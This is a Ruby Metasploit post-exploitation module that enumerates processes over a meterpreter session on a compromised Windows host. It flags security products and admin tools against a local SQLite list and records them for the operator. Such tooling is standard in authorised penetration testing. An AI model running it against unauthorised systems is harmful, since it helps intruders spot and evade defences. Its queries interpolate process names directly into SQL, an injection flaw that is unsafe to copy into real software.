require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'
require 'sqlite3'

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Dangerous Processes',
      'Description'   => %q{
        This module attempts to identify security products and admin tools by the process name. 
      },
      'License'       => BSD_LICENSE ,
      'Author'        => [ 'Carlos Perez <carlos.perez[at]trustedsec.com>' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run()
    print_status("Running post module against #{sysinfo['Computer']}")
    print_line
    print_status("###########################")
    print_status("# Verify system processes #")
    print_status("###########################")
    print_line
    
    all_processes = get_processes
    check_processes(all_processes)
  end

  def get_processes
    vprint_status('Collecting current processes.')
    all_processes = session.sys.process.get_processes
    return all_processes
  end
    #-----------------------------------------------------------------------
    def check_processes(all_processes)
        db_path = "#{::Msf::Config.local_directory + File::SEPARATOR }Processes.db"
        if  !File::exist?(db_path)
          print_error("Could not find process database in #{db_path}")
          return
        end
    
        begin
          db = SQLite3::Database.new(db_path)
    
          # Save all services as a note.
          tbl_services = Rex::Text::Table.new(
            'Columns' => [
              'Name',
              'Path',
              'PID',
              'PPID',
              'Arch',
              'User'
            ]
          )
          # Check for security products
          tbl = Rex::Text::Table.new(
            'Columns' => [
              'Name',
              'Path',
              'PID',
              'Arch',
              'Comment'
            ]
          )

          tbl_report = Rex::Text::Table.new(
            'Columns' => [
              'Name',
              'Path',
              'PID',
              'Arch',
              'Comment'
            ]
          )
          print_status('Checking for seurity products.')
          all_processes.each do |proc|
            result = db.execute( "SELECT comment FROM processinformation WHERE name ='#{proc['name']}' AND type = 'SECURITY_PRODUCT'" )
            if result.length > 0
              tbl << [proc['name'], proc['path'], proc['pid'], proc['arch'], "%red#{result[0][0]}%clr"]
              tbl_report << [proc['name'], proc['path'], proc['pid'], proc['arch'], "#{result[0][0]}"]
            end

            # save the processes in to a table to collect as a note.
            tbl_services << [proc['name'], proc['path'], proc['pid'],proc['ppid'], proc['arch'], proc['user']]
            
          end

          print_good("\tSaving #{tbl_services.rows.length} current processes info")
          report_note(
              :host   => session.session_host,
              :type   => 'host.info.processes',
              :data   => { :products => tbl_services.to_csv },
              :update => :unique_data
          )

          if tbl.rows.length > 0
            print_status('Security Products Processes:')
            report_note(
                :host   => session.session_host,
                :type   => 'host.control.product',
                :data   => { :products => tbl_report.to_csv },
                :update => :unique_data
            )
            print_line tbl.to_s
          else
            print_good('No known security product process found.')
          end
    
          tbl.rows = []
          tbl_report.rows = []
          print_status('Checking for admin tools.')
          all_processes.each do |proc|
            result = db.execute( "SELECT comment FROM processinformation WHERE (name ='#{proc['name']}' AND type = 'ADMIN_TOOL')" )
            if result.length > 0
              tbl << [proc['name'], proc['path'], proc['pid'], proc['arch'], "%red#{result[0][0]}%clr"]
              tbl_report << [proc['name'], proc['path'], proc['pid'], proc['arch'], "#{result[0][0]}"]
            end
          end
          if tbl.rows.length > 0
            print_status('Admin Tools Processes:')
            report_note(
                :host   => session.session_host,
                :type   => 'host.control.admin_tools',
                :data   => { :products => tbl_report.to_csv },
                :update => :unique_data
            )
            print_line tbl.to_s
          else
            print_good('No known admin tool process found.')
          end
    
          db.close if db
        rescue SQLite3::Exception => e 
        
          print_error("Exception occurred")
          print_error(e)
        
        ensure
          db.close if db
        end
      end
    
end